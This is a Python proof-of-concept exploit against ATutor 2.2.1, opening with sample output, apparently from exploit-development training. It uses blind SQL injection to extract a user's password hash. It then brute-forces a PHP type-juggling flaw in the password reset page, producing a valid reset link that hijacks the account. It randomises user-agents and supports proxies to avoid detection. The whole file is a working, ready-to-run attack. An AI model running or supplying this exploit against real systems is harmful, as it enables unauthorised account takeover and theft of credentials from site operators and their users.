# DEMONSTRATION
# $ python3 poc_atutor_2.2.1_sqli_and_type-juggle_generate-reset-link.py 1 http://192.168.252.12/atutor/
# Retrieving query using: select password from AT_members where member_id = 1
# adf8b21318c032bd05ea40e77bd02db0482a411b

# [*] Sending update request 56256 using digit "74856" and hash 0e0883364543036
# [+] VALID RESET LINK: http://192.168.252.12/atutor/password_reminder.php?id=1&g=74856&h=0

#!/usr/bin/python3
import hashlib,string,itertools,re,sys,time
import requests
import urllib3
import os
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Printable ASCII chars
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[!] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def random_agent():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def get_session(url,headers):
    """
    Required to get a valid cookie session, related to the used User-Agent
    """
    session = requests.Session()
    r = session.get(url=url,headers=headers,timeout=timeout,verify=False)
    return session

def sqli(url,session,headers,inj_str,content_len):
    comment_inj_str = re.sub(" ","/**/",inj_str)
    inj_params = {'q':comment_inj_str}
    inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
    r = session.get(url,params=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)
    if r:
        resp_content_len = len(r.content)
        if (resp_content_len > content_len):
            return True

def inject(str_len,str_query,url,session,headers,prefix,suffix,content_len):
    extracted = ""
    or_substr = " or (ascii(substring(("
    
    for i in range(1,str_len):
        # Check of current pos still contains a valid ASCII char using >
        inj_str = prefix + or_substr + str_query + ")," + str(i) + ",1)))>" + str(ascii_begin-1) + suffix
        retr_pos = sqli(url,session,headers,inj_str,content_len)
        if not retr_pos:
            break
        
        for j in range(ascii_begin,ascii_end):
            # Continue guessing the character by comparing using =
            inj_str = prefix + or_substr + str_query + ")," + str(i) + ",1)))=" + str(j) + suffix
            retr_value = sqli(url,session,headers,inj_str,content_len)
            if retr_value:
                extracted += chr(j)
                extracted_char = chr(j)
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
    
    print("\n")
    return extracted

def gen_code(url,session,headers,passw_hash,id):
    count = 0
    current_epoch_days = int(((int(time.time()) / 60) / 60) / 24)       # Calculate current Epoch in days
    max_epoch_days = 999999                                             # Maximum Epoch in days
    digits_passw_hash = ''.join(re.findall(r'^\d+',passw_hash))         # Search for digits starting in retrieved hash
    for epoch_day in range(current_epoch_days, max_epoch_days + 1):     # Add one to include stop value for range
        if digits_passw_hash:
            str_to_hash = str(int(id) + int(epoch_day) + int(digits_passw_hash))
        else:        
            str_to_hash = str(int(id) + int(epoch_day))
        hash = hashlib.sha1(str_to_hash.encode()).hexdigest()[5:5+15]
        if re.match(r'0+[eE]\d+$', hash):
            print("[*] Sending update request " + str(count) + " using digit \"" + str(epoch_day) + "\" and hash " + hash)
            if do_type_juggle(url,session,headers,id,epoch_day):
                exit(1)
        count += 1

def do_type_juggle(url,session,headers,id,epoch_day):
    params = {'id':id,
            'g':str(epoch_day),
            'h':'0'}
    r = session.get(url=url,headers=headers,params=params,timeout=timeout,verify=False,allow_redirects=False)
    params_url = r.url   
    r = session.get(url=url,headers=headers,params=params,timeout=timeout,verify=False,allow_redirects=True)
    if "Enter a new password for your account" in r.text:
        print("[+] VALID RESET LINK: " + r.url + "\n")
        return True

# Main
def main(argv):
    if len(sys.argv) == 3:
        member_id = sys.argv[1]
        url = sys.argv[2]
    else:
        print("[*] Usage: " + sys.argv[0] + " <member_id> <atutor_base_url>")
        print("[*] Example: " + sys.argv[0] + " 1 http://192.168.252.14/ATutor/\n")
        exit(0)

    # Variables
    str_len = 50
    content_len = 20
    prefix = "1')"
    suffix = "%23"
    sqli_url = url + "mods/_standard/social/index_public.php"
    juggle_url = url + "password_reminder.php"
    sql_query = "select password from AT_members where member_id = " + member_id
    headers = random_agent()

    # Do stuff
    try:
        # Get a regular session
        session = get_session(url,headers)

        # Print string
        print("Retrieving query using: " + sql_query)

        # Extract creation_date
        passwd_hash = inject(str_len,sql_query,sqli_url,session,headers,prefix,suffix,content_len)

        # Do type juggle, calculate hash using creation_date
        gen_code(juggle_url,session,headers,passwd_hash,member_id)

        # Done
        print("\n[+] Done!")

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])

